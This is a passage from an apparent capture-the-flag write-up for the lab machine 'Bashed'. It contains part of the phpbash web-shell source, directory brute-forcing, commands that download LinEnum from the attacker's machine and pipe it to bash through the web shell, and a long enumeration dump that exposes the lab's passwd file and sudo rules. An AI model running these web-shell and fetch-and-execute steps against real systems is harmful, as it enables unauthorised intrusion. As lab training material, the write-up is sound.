\u0026#34;application/x-www-form-urlencoded\u0026#34;); request.send(\u0026#34;cmd=\u0026#34;+encodeURIComponent(command)); return false; } function uploadFile() { var formData = new FormData(); formData.append(\u0026#39;file\u0026#39;, fileBrowserElement.files[0], fileBrowserElement.files[0].name); formData.append(\u0026#39;path\u0026#39;, currentDir); var request = new XMLHttpRequest(); request.onreadystatechange = function() { if (request.readyState == XMLHttpRequest.DONE) { outputElement.innerHTML += request.responseText+\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } }; request.open(\u0026#34;POST\u0026#34;, \u0026#34;\u0026#34;, true); request.send(formData); outputElement.innerHTML += \u0026#34;\u0026lt;div style=\u0026#39;color:#ff0000; float: left;\u0026#39;\u0026gt;\u0026#34;+username+\u0026#34;@\u0026#34;+hostname+\u0026#34;\u0026lt;/div\u0026gt;\u0026lt;div style=\u0026#39;float: left;\u0026#39;\u0026gt;\u0026#34;+\u0026#34;:\u0026#34;+currentDir+\u0026#34;# Uploading \u0026#34;+fileBrowserElement.files[0].name+\u0026#34;...\u0026lt;/div\u0026gt;\u0026lt;br\u0026gt;\u0026#34;; } function updateInputWidth() { inputTextElement.style.width = inputElement.clientWidth - usernameElement.clientWidth - 15; } document.onkeydown = checkForArrowKeys; function checkForArrowKeys(e) { e = e || window.event; if (e.keyCode == \u0026#39;38\u0026#39;) { previousCommand(); } else if (e.keyCode == \u0026#39;40\u0026#39;) { nextCommand(); } } function previousCommand() { if (currentCommand != 0) { switchCommand(currentCommand-1); } } function nextCommand() { if (currentCommand != commandHistory.length) { switchCommand(currentCommand+1); } } function switchCommand(newCommand) { currentCommand = newCommand; if (currentCommand == commandHistory.length) { inputTextElement.value = \u0026#34;\u0026#34;; } else { inputTextElement.value = commandHistory[currentCommand]; setTimeout(function(){ inputTextElement.selectionStart = inputTextElement.selectionEnd = 10000; }, 0); } } document.getElementById(\u0026#34;form\u0026#34;).addEventListener(\u0026#34;submit\u0026#34;, function(event){ event.preventDefault() }); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   Directory Enum 1  gobuster dir -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt   1 2 3 4 5 6 7  /images (Status: 301) [Size: 311] [--\u0026gt; http://10.10.10.68/images/] /uploads (Status: 301) [Size: 312] [--\u0026gt; http://10.10.10.68/uploads/] /php (Status: 301) [Size: 308] [--\u0026gt; http://10.10.10.68/php/] /css (Status: 301) [Size: 308] [--\u0026gt; http://10.10.10.68/css/] /dev (Status: 301) [Size: 308] [--\u0026gt; http://10.10.10.68/dev/] /js (Status: 301) [Size: 307] [--\u0026gt; http://10.10.10.68/js/] /fonts (Status: 301) [Size: 310] [--\u0026gt; http://10.10.10.68/fonts/]   Exploitation 1  git clone https://github.com/rebootuser/LinEnum    Copy the LinEnum.sh to the directory -\u0026gt; https://github.com/carlospolop/PEASS-ng/releases  1  python -m SimpleHTTPServer 80 # In the attacing machine   1 2 3  # In 10.10.10.68/dev/phpbash.php curl 10.10.14.28/LinEnum.sh | bash   1 2 3  which curl # No curl which wget # Yes curl   1  wget 10.10.14.28/LinEnum.sh   1 2 3 4 5  cd /dev/shm wget 10.10.14.28/LinEnum.sh bash LinEnum.sh # To run the command   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285 286 287 288 289 290 291 292 293 294 295 296 297 298 299 300 301 302 303 304 305 306 307 308 309 310 311 312 313 314 315 316 317 318 319 320 321 322 323 324 325 326 327 328 329 330 331 332 333 334 335 336 337 338 339 340 341 342 343 344 345 346 347 348 349 350 351 352 353 354 355 356 357 358 359 360 361 362 363 364 365 366 367 368 369 370 371 372 373 374 375 376 377 378 379 380 381 382 383 384 385 386 387 388 389 390 391 392 393 394 395 396 397 398 399 400 401 402 403 404 405 406 407 408 409 410 411 412 413 414 415 416 417 418 419 420 421 422 423 424 425 426 427 428 429 430 431 432 433 434 435 436 437 438 439 440 441 442 443 444 445 446 447 448 449 450 451 452 453 454 455 456 457 458 459 460 461 462 463 464 465 466 467 468 469 470 471 472 473 474 475 476 477 478 479 480 481 482 483 484 485 486 487 488 489 490 491 492 493 494 495 496 497 498 499 500 501 502 503 504 505 506 507 508 509 510 511 512 513 514 515 516 517 518 519 520 521 522 523 524 525 526 527 528 529 530 531 532 533 534 535 536 537 538 539 540 541 542 543 544 545 546 547 548 549 550 551 552 553 554 555 556 557 558 559 560 561 562 563 564 565 566 567 568 569 570 571 572 573 574 575 576 577 578 579 580 581 582 583 584 585 586 587 588 589 590 591 592 593 594 595 596 597 598 599 600 601 602 603 604 605 606 607 608 609 610 611 612 613 614 615 616 617 618 619 620 621 622 623 624 625 626 627 628 629 630 631 632 633 634 635 636 637 638 639 640 641 642 643 644 645 646 647 648 649 650 651 652 653 654 655 656 657 658 659 660 661 662 663 664 665 666 667 668 669 670 671 672 673 674 675 676 677 678 679 680 681 682 683 684 685 686 687 688 689 690 691 692 693 694 695 696 697 698 699 700 701 702 703 704 705 706 707 708 709 710 711 712 713 714 715 716 717 718 719 720 721 722 723 724 725 726 727 728 729 730 731 732 733 734 735 736 737 738 739 740 741 742 743 744 745 746 747 748 749 750 751 752 753 754 755 756 757 758 759 760 761 762 763 764 765 766 767 768 769 770 771 772 773 774 775 776 777 778 779 780 781 782 783 784 785 786 787 788 789 790 791 792 793 794 795 796 797 798 799 800 801 802 803 804 805 806 807 808 809 810 811 812 813 814 815 816 817 818 819 820 821 822 823 824 825 826 827 828 829 830 831 832 833 834 835 836 837 838 839 840 841 842 843 844 845 846 847 848 849 850 851 852 853 854 855 856 857 858 859 860 861 862 863 864 865 866 867 868 869 870 871 872 873 874 875 876 877 878 879 880 881 882 883 884 885 886 887 888 889 890 891 892 893 894 895 896 897 898 899 900 901 902 903 904 905 906 907 908 909 910 911 912 913 914 915 916 917 918 919 920 921 922 923 924 925 926 927 928 929 930 931 932 933 934 935 936 937 938 939 940 941 942 943 944 945 946 947 948 949 950 951 952 953 954 955 956 957 958 959 960 961 962 963 964 965 966 967 968 969 970 971 972 973 974 975 976 977 978 979 980 981 982 983 984 985 986 987 988 989 990 991 992 993 994 995 996 997 998 999 1000 1001 1002 1003 1004 1005 1006 1007 1008 1009 1010 1011 1012 1013 1014 1015 1016 1017 1018 1019 1020 1021 1022 1023 1024 1025 1026 1027 1028 1029 1030 1031 1032 1033 1034 1035 1036 1037 1038 1039 1040 1041 1042 1043 1044 1045 1046 1047 1048 1049 1050 1051 1052 1053 1054 1055 1056 1057 1058 1059 1060 1061 1062 1063 1064 1065 1066 1067 1068 1069 1070 1071 1072 1073 1074 1075 1076 1077 1078 1079 1080 1081 1082 1083 1084 1085 1086 1087 1088 1089 1090 1091 1092 1093 1094 1095 1096 1097 1098 1099 1100 1101 1102 1103 1104 1105 1106 1107 1108 1109 1110 1111 1112 1113 1114 1115 1116 1117 1118 1119 1120 1121 1122 1123 1124 1125 1126 1127 1128 1129 1130 1131 1132 1133 1134 1135 1136 1137 1138 1139 1140 1141 1142 1143 1144 1145 1146 1147 1148 1149 1150 1151 1152  [00;31m#########################################################[00m [00;31m#[00m [00;33mLocal Linux Enumeration \u0026amp; Privilege Escalation Script[00m [00;31m#[00m [00;31m#########################################################[00m [00;33m# www.rebootuser.com[00m [00;33m# version 0.982[00m [-] Debug Info [00;33m[+] Thorough tests = Disabled[00m [00;33mScan started at: Sat Jan 29 11:39:45 PST 2022 [00m [00;33m### SYSTEM ##############################################[00m [00;31m[-] Kernel information:[00m Linux bashed 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux [00;31m[-] Kernel information (continued):[00m Linux version 4.4.0-62-generic (buildd@lcy01-30) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 [00;31m[-] Specific release information:[00m DISTRIB_ID=Ubuntu DISTRIB_RELEASE=16.04 DISTRIB_CODENAME=xenial DISTRIB_DESCRIPTION=\u0026#34;Ubuntu 16.04.2 LTS\u0026#34; NAME=\u0026#34;Ubuntu\u0026#34; VERSION=\u0026#34;16.04.2 LTS (Xenial Xerus)\u0026#34; ID=ubuntu ID_LIKE=debian PRETTY_NAME=\u0026#34;Ubuntu 16.04.2 LTS\u0026#34; VERSION_ID=\u0026#34;16.04\u0026#34; HOME_URL=\u0026#34;http://www.ubuntu.com/\u0026#34; SUPPORT_URL=\u0026#34;http://help.ubuntu.com/\u0026#34; BUG_REPORT_URL=\u0026#34;http://bugs.launchpad.net/ubuntu/\u0026#34; VERSION_CODENAME=xenial UBUNTU_CODENAME=xenial [00;31m[-] Hostname:[00m bashed [00;33m### USER/GROUP ##########################################[00m [00;31m[-] Current user/group info:[00m uid=33(www-data) gid=33(www-data) groups=33(www-data) [00;31m[-] Users that have previously logged onto the system:[00m Username Port From Latest arrexel tty1 Sat Dec 23 20:20:46 -0800 2017 [00;31m[-] Who else is logged on:[00m 11:39:45 up 1:23, 0 users, load average: 0.00, 0.01, 0.02 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT [00;31m[-] Group memberships:[00m uid=0(root) gid=0(root) groups=0(root) uid=1(daemon) gid=1(daemon) groups=1(daemon) uid=2(bin) gid=2(bin) groups=2(bin) uid=3(sys) gid=3(sys) groups=3(sys) uid=4(sync) gid=65534(nogroup) groups=65534(nogroup) uid=5(games) gid=60(games) groups=60(games) uid=6(man) gid=12(man) groups=12(man) uid=7(lp) gid=7(lp) groups=7(lp) uid=8(mail) gid=8(mail) groups=8(mail) uid=9(news) gid=9(news) groups=9(news) uid=10(uucp) gid=10(uucp) groups=10(uucp) uid=13(proxy) gid=13(proxy) groups=13(proxy) uid=33(www-data) gid=33(www-data) groups=33(www-data) uid=34(backup) gid=34(backup) groups=34(backup) uid=38(list) gid=38(list) groups=38(list) uid=39(irc) gid=39(irc) groups=39(irc) uid=41(gnats) gid=41(gnats) groups=41(gnats) uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup) uid=100(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync) uid=101(systemd-network) gid=103(systemd-network) groups=103(systemd-network) uid=102(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve) uid=103(systemd-bus-proxy) gid=105(systemd-bus-proxy) groups=105(systemd-bus-proxy) uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm) uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup) uid=106(messagebus) gid=110(messagebus) groups=110(messagebus) uid=107(uuidd) gid=111(uuidd) groups=111(uuidd) uid=1000(arrexel) gid=1000(arrexel) groups=1000(arrexel),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare) uid=1001(scriptmanager) gid=1001(scriptmanager) groups=1001(scriptmanager) [00;31m[-] It looks like we have some admin users:[00m uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm) uid=1000(arrexel) gid=1000(arrexel) groups=1000(arrexel),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare) [00;31m[-] Contents of /etc/passwd:[00m root❌0:0:root:/root:/bin/bash daemon❌1:1:daemon:/usr/sbin:/usr/sbin/nologin bin❌2:2:bin:/bin:/usr/sbin/nologin sys❌3:3:sys:/dev:/usr/sbin/nologin sync❌4:65534:sync:/bin:/bin/sync games❌5:60:games:/usr/games:/usr/sbin/nologin man❌6:12:man:/var/cache/man:/usr/sbin/nologin lp❌7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail❌8:8:mail:/var/mail:/usr/sbin/nologin news❌9:9:news:/var/spool/news:/usr/sbin/nologin uucp❌10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy❌13:13:proxy:/bin:/usr/sbin/nologin www-data❌33:33:www-data:/var/www:/usr/sbin/nologin backup❌34:34:backup:/var/backups:/usr/sbin/nologin list❌38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc❌39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats❌41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody❌65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync❌100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network❌101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve❌102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy❌103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false syslog❌104:108::/home/syslog:/bin/false _apt❌105:65534::/nonexistent:/bin/false messagebus❌106:110::/var/run/dbus:/bin/false uuidd❌107:111::/run/uuidd:/bin/false arrexel❌1000:1000:arrexel,,,:/home/arrexel:/bin/bash scriptmanager❌1001:1001:,,,:/home/scriptmanager:/bin/bash [00;31m[-] Super user account(s):[00m root [00;33m[+] We can sudo without supplying a password![00m Matching Defaults entries for www-data on bashed: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www-data may run the following commands on bashed: (scriptmanager : scriptmanager) NOPASSWD: ALL [00;31m[-] Accounts that have recently used sudo:[00m /home/arrexel/.sudo_as_admin_successful [00;31m[-] Are permissions on /home directories lax:[00m total 16K drwxr-xr-x 4 root root 4.0K Dec 4 2017 . drwxr-xr-x 23 root root 4.0K Dec 4 2017 .. drwxr-xr-x 4 arrexel arrexel 4.0K Dec 4 2017 arrexel drwxr-xr-x 3 scriptmanager scriptmanager 4.0K Dec 4 2017 scriptmanager [00;33m### ENVIRONMENTAL #######################################[00m [00;31m[-] Environment information:[00m APACHE_PID_FILE=/var/run/apache2/apache2.pid APACHE_RUN_USER=www-data APACHE_LOG_DIR=/var/log/apache2 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin PWD=/dev/shm APACHE_RUN_GROUP=www-data LANG=C SHLVL=1 APACHE_LOCK_DIR=/var/lock/apache2 APACHE_RUN_DIR=/var/run/apache2 _=/usr/bin/env [00;31m[-] Path information:[00m /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin drwxr-xr-x 2 root root 4096 Dec 4 2017 /bin drwxr-xr-x 2 root root 4096 Dec 4 2017 /sbin drwxr-xr-x 2 root root 20480 Dec 4 2017 /usr/bin drwxr-xr-x 2 root root 4096 Feb 15 2017 /usr/local/bin drwxr-xr-x 2 root root 4096 Feb 15 2017 /usr/local/sbin drwxr-xr-x 2 root root 4096 Dec 4 2017 /usr/sbin [00;31m[-] Available shells:[00m # /etc/shells: valid login shells /bin/sh /bin/dash /bin/bash /bin/rbash [00;31m[-] Current umask value:[00m 0022 u=rwx,g=rx,o=rx [00;31m[-] umask value as specified in /etc/login.defs:[00m UMASK 022 [00;31m[-] Password and storage information:[00m PASS_MAX_DAYS 99999 PASS_MIN_DAYS 0 PASS_WARN_AGE 7 ENCRYPT_METHOD SHA512 [00;33m### JOBS/TASKS ##########################################[00m [00;31m[-] Cron jobs:[00m -rw-r--r-- 1 root root 722 Apr 5 2016 /etc/crontab /etc/cron.d: total 20 drwxr-xr-x 2 root root 4096 Dec 4 2017 . drwxr-xr-x 89 root root 4096 Dec 4 2017 .. -rw-r--r-- 1 root root 102 Apr 5 2016 .placeholder -rw-r--r-- 1 root root 670 Mar 1 2016 php -rw-r--r-- 1 root root 191 Dec 4 2017 popularity-contest /etc/cron.daily: total 48 drwxr-xr-x 2 root root 4096 Dec 4 2017 . drwxr-xr-x 89 root root 4096 Dec 4 2017 .. -rw-r--r-- 1 root root 102 Apr 5 2016 .placeholder -rwxr-xr-x 1 root root 539 Apr 5 2016 apache2 -rwxr-xr-x 1 root root 1474 Jan 17 2017 apt-compat -rwxr-xr-x 1 root root 355 May 22 2012 bsdmainutils -rwxr-xr-x 1 root root 1597 Nov 26 2015 dpkg -rwxr-xr-x 1 root root 372 May 5 2015 logrotate -rwxr-xr-x 1 root root 1293 Nov 6 2015 man-db -rwxr-xr-x 1 root root 435 Nov 17 2014 mlocate -rwxr-xr-x 1 root root 249 Nov 12 2015 passwd -rwxr-xr-x 1 root root 3449 Feb 26 2016 popularity-contest /etc/cron.hourly: total 12 drwxr-xr-x 2 root root 4096 Dec 4 2017 . drwxr-xr-x 89 root root 4096 Dec 4 2017 .. -rw-r--r-- 1 root root 102 Apr 5 2016 .placeholder /etc/cron.monthly: total 12 drwxr-xr-x 2 root root 4096 Dec 4 2017 . drwxr-xr-x 89 root root 4096 Dec 4 2017 .. -rw-r--r-- 1 root root 102 Apr 5 2016 .placeholder /etc/cron.weekly: total 20 drwxr-xr-x 2 root root 4096 Dec 4 2017 . drwxr-xr-x 89 root root 4096 Dec 4 2017 .. -rw-r--r-- 1 root root 102 Apr 5 2016 .placeholder -rwxr-xr-x 1 root root 86 Apr 13 2016 fstrim -rwxr-xr-x 1 root root 771 Nov 6 2015 man-db [00;31m[-] Crontab contents:[00m # /etc/crontab: system-wide crontab # Unlike any other crontab you don\u0026#39;t have to run the `crontab\u0026#39; # command to install the new version when you edit this file # and files in /etc/cron.d. These files also have username fields, # that none of the other crontabs do. SHELL=/bin/sh PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin # m h dom mon dow user command 17 * * * * root cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.hourly 25 6 * * * root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.daily ) 47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.weekly ) 52 6 1 * * root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.monthly ) # [00;31m[-] Anything interesting in /var/spool/cron/crontabs:[00m total 0 d????????? ? ? ? ? ? . d????????? ? ? ? ? ? .. -????????? ? ? ? ? ? root [00;31m[-] Systemd timers:[00m NEXT LEFT LAST PASSED UNIT ACTIVATES Sat 2022-01-29 18:09:40 PST 6h left Sat 2022-01-29 10:15:56 PST 1h 23min ago apt-daily.timer apt-daily.service Sun 2022-01-30 10:30:56 PST 22h left Sat 2022-01-29 10:30:56 PST 1h 8min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service 2 timers listed. [2mEnable thorough tests to see inactive timers[00m [00;33m### NETWORKING ##########################################[00m [00;31m[-] Network and IP info:[00m ens33 Link encap:Ethernet HWaddr 00:50:56:b9:89:fa inet addr:10.10.10.68 Bcast:10.10.10.255 Mask:255.255.255.255 inet6 addr: fe80::250:56ff:feb9:89fa/64 Scope:Link UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:205649 errors:0 dropped:69 overruns:0 frame:0 TX packets:201739 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:32067305 (32.0 MB) TX bytes:99906403 (99.9 MB) lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 inet6 addr: ::1/128 Scope:Host UP LOOPBACK RUNNING MTU:65536 Metric:1 RX packets:26792 errors:0 dropped:0 overruns:0 frame:0 TX packets:26792 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1 RX bytes:1984408 (1.9 MB) TX bytes:1984408 (1.9 MB) [00;31m[-] ARP history:[00m ? (10.10.10.2) at 00:50:56:b9:2e:45 [ether] on ens33 [00;31m[-] Default route:[00m default 10.10.10.2 0.0.0.0 UG 0 0 0 ens33 [00;31m[-] Listening TCP:[00m Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp6 0 0 :::80 :::* LISTEN - [00;31m[-] Listening UDP:[00m Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name [00;33m### SERVICES #############################################[00m [00;31m[-] Running processes:[00m USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND root 1 0.0 0.5 37808 5788 ? Ss 10:15 0:01 /sbin/init noprompt root 2 0.0 0.0 0 0 ? S 10:15 0:00 [kthreadd] root 3 0.0 0.0 0 0 ? S 10:15 0:00 [ksoftirqd/0] root 5 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [kworker/0:0H] root 7 0.0 0.0 0 0 ? S 10:15 0:00 [rcu_sched] root 8 0.0 0.0 0 0 ? S 10:15 0:00 [rcu_bh] root 9 0.0 0.0 0 0 ? S 10:15 0:00 [migration/0] root 10 0.0 0.0 0 0 ? S 10:15 0:00 [watchdog/0] root 11 0.0 0.0 0 0 ? S 10:15 0:00 [kdevtmpfs] root 12 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [netns] root 13 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [perf] root 14 0.0 0.0 0 0 ? S 10:15 0:00 [khungtaskd] root 15 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [writeback] root 16 0.0 0.0 0 0 ? SN 10:15 0:00 [ksmd] root 17 0.0 0.0 0 0 ? SN 10:15 0:00 [khugepaged] root 18 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [crypto] root 19 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [kintegrityd] root 20 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [bioset] root 21 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [kblockd] root 22 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [ata_sff] root 23 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [md] root 24 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [devfreq_wq] root 26 0.0 0.0 0 0 ? S 10:15 0:00 [kworker/0:1] root 28 0.0 0.0 0 0 ? S 10:15 0:00 [kswapd0] root 29 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [vmstat] root 30 0.0 0.0 0 0 ? S 10:15 0:00 [fsnotify_mark] root 31 0.0 0.0 0 0 ? S 10:15 0:00 [ecryptfs-kthrea] root 47 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [kthrotld] root 48 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [acpi_thermal_pm] root 49 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [bioset] root 50 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [bioset] root 51 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [bioset] root 52 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [bioset] root 53 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [bioset] root 54 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [bioset] root 55 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [bioset] root 56 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [bioset] root 57 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [bioset] root 58 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [bioset] root 59 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [bioset] root 60 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [bioset] root 61 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [bioset] root 62 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [bioset] root 63 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [bioset] root 64 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [bioset] root 65 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [bioset] root 66 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [bioset] root 67 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [bioset] root 68 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [bioset] root 69 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [bioset] root 70 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [bioset] root 71 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [bioset] root 72 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [bioset] root 73 0.0 0.0 0 0 ? S 10:15 0:00 [scsi_eh_0] root 74 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [scsi_tmf_0] root 75 0.0 0.0 0 0 ? S 10:15 0:00 [scsi_eh_1] root 76 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [scsi_tmf_1] root 77 0.0 0.0 0 0 ? S 10:15 0:00 [kworker/u256:2] root 83 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [ipv6_addrconf] root 97 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [bioset] root 98 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [deferwq] root 99 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [charger_manager] root 100 0.0 0.0 0 0 ? S 10:15 0:00 [kworker/u256:4] root 157 0.0 0.0 0 0 ? S 10:15 0:00 [scsi_eh_2] root 158 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [scsi_tmf_2] root 159 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [vmw_pvscsi_wq_2] root 160 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [bioset] root 173 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [kpsmoused] root 178 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [ttm_swap] root 201 0.0 0.0 0 0 ? S 10:15 0:00 [jbd2/sda1-8] root 202 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [ext4-rsv-conver] root 237 0.0 0.2 28332 2852 ? Ss 10:15 0:00 /lib/systemd/systemd-journald root 243 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [kworker/0:1H] root 255 0.0 0.0 0 0 ? S 10:15 0:00 [kauditd] root 275 0.0 0.2 93088 2356 ? Ssl 10:15 0:00 vmware-vmblock-fuse /run/vmblock-fuse -o rw,subtype=vmware-vmblock,default_permissions,allow_other,dev,suid root 298 0.0 0.3 44416 3864 ? Ss 10:15 0:00 /lib/systemd/systemd-udevd systemd+ 422 0.0 0.2 100324 2536 ? Ssl 10:15 0:00 /lib/systemd/systemd-timesyncd message+ 556 0.0 0.3 42900 3968 ? Ss 10:15 0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation root 569 0.0 0.2 29008 2964 ? Ss 10:15 0:00 /usr/sbin/cron -f root 570 0.0 0.1 20100 1128 ? Ss 10:15 0:00 /lib/systemd/systemd-logind root 573 0.0 0.6 275760 6232 ? Ssl 10:15 0:00 /usr/lib/accountsservice/accounts-daemon syslog 574 0.0 0.3 256396 3360 ? Ssl 10:15 0:00 /usr/sbin/rsyslogd -n root 591 0.0 0.9 111868 9648 ? Ss 10:15 0:04 /usr/bin/vmtoolsd root 643 0.0 0.0 0 0 ? S\u0026lt; 10:15 0:00 [edac-poller] root 664 0.0 0.1 15940 1776 tty1 Ss+ 10:15 0:00 /sbin/agetty --noclear tty1 linux root 771 0.0 2.4 255896 24876 ? Ss 10:15 0:00 /usr/sbin/apache2 -k start www-data 775 0.0 1.0 256220 10944 ? S 10:15 0:01 /usr/sbin/apache2 -k start www-data 776 0.0 1.0 256236 10676 ? S 10:15 0:01 /usr/sbin/apache2 -k start www-data 777 0.0 1.2 256380 12512 ? S 10:15 0:01 /usr/sbin/apache2 -k start www-data 778 0.0 1.2 256380 12036 ? S 10:15 0:01 /usr/sbin/apache2 -k start www-data 813 0.0 1.1 256212 11836 ? S 10:23 0:01 /usr/sbin/apache2 -k start www-data 816 0.0 0.7 255976 7780 ? S 10:23 0:01 /usr/sbin/apache2 -k start www-data 817 0.0 0.9 256148 9080 ? S 10:23 0:01 /usr/sbin/apache2 -k start www-data 819 0.0 1.1 256204 11684 ? S 10:23 0:01 /usr/sbin/apache2 -k start root 844 0.0 0.0 0 0 ? S 10:30 0:02 [kworker/0:0] www-data 1085 0.1 1.1 256372 11904 ? S 11:21 0:01 /usr/sbin/apache2 -k start www-data 1089 0.1 0.7 255976 7780 ? S 11:21 0:01 /usr/sbin/apache2 -k start www-data 1211 0.0 0.0 4508 704 ? S 11:39 0:00 sh -c cd /dev/shm; bash LinEnum.sh 2\u0026gt;\u0026amp;1 www-data 1212 0.0 0.3 19028 3848 ? S 11:39 0:00 bash LinEnum.sh www-data 1213 0.0 0.3 19072 3620 ? S 11:39 0:00 bash LinEnum.sh www-data 1214 0.0 0.0 4384 688 ? S 11:39 0:00 tee -a www-data 1421 0.0 0.3 19056 3012 ? S 11:39 0:00 bash LinEnum.sh www-data 1422 0.0 0.2 